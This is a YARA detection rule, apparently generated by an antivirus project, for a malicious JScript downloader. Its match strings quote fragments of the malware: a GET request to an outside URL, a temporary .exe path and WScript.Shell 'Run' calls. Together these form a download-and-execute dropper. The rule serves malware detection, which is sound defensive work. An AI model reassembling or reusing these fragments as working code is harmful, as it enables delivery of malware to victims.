rule sig_20160328_4538010314fd9439692ccda6438fdcf2 {
  meta:
    description = "datamaliciousorder - file 20160328_4538010314fd9439692ccda6438fdcf2.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "4905b28ed4b4ca9fe2b2f9848d0fe09a838a45349cdbd1ceadf799a0c26dc403"

  strings:
    $s1  = "function Zpjniode() {return Xlssnzdojo[\"ExpandEnvironmentStrings\"](\"%TEMP%/\") + \"JzFAlXeOOheLo1B.exe\";};" fullword ascii
    $s2  = "do {WScript[Yxwujrf](Puynanpgq() * 11)} while (Svehfmwcy[\"readystate\"] < 4 );" fullword ascii
    $s3  = "function Pvultmmm(Hhyyn, Xranslixtn){return Hhyyn - Xranslixtn;};" fullword ascii
    $s4  = "Svehfmwcy[Mdardijoxk](\"GET\", \"http://www.cloudfire.pt/l3iska\", false);" fullword ascii
    $s5  = "var Xlssnzdojo = function Ugrdfw() {return WScript[Pjwle](\"WScript.Shell\");}();" fullword ascii
    $s6  = "function Akwmrzxafr() {return ((Amuqv == true) && (Amuqv == Strxupz)) ? 1 : Hjpqngcm;};" fullword ascii
    $s7  = "function Sisncywzxa(Fgbwxm){Xlssnzdojo[\"Run\"](Fgbwxm, Hjpqngcm, Hjpqngcm);};" fullword ascii
    $s8  = "function Txjrh(){return Pjwle;};" fullword ascii
    $s9  = "var Strxupz = false;" fullword ascii
    $s10 = "var Amuqv = false;" fullword ascii
    $s11 = "var Zscjcx = new this[\"Date\"]();" fullword ascii
    $s12 = "function Pqhucn(){return Bkaijbut;};" fullword ascii
    $s13 = " while (Nnpkgpsw){" fullword ascii
    $s14 = "Strxupz = true; " fullword ascii
    $s15 = "var Zjanalx = false;" fullword ascii
    $s16 = "return Pvultmmm(Ejppskm, Jwdaru);" fullword ascii
    $s17 = "function Rqiaqufx(Uzywy) {var Jyqwkhivn = (1, 2, 3, 4, 5, Uzywy); return Jyqwkhivn;};" fullword ascii
    $s18 = "Amuqv = true; " fullword ascii
    $s19 = "function Puynanpgq(){return 22;};" fullword ascii
    $s20 = "function Dhbsp()" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}